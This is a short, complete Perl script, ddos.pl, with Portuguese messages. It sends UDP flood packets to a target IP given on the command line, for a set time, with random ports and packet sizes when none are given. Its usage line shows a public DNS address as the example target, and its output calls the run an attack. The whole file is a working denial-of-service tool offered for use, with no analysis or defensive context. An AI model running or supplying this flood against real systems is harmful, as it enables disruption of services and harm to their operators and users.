#by gsp
# coding = utf-8
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "como usar --> perl ddos.pl 8.8.8.8 80 2048 500\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "erro!\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~para cancelar o ataque aperte \'Ctrl-C\'\n\n";
print "|IP|\t\t |Porta|\t\t |pacote|\t\t |Tempo|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}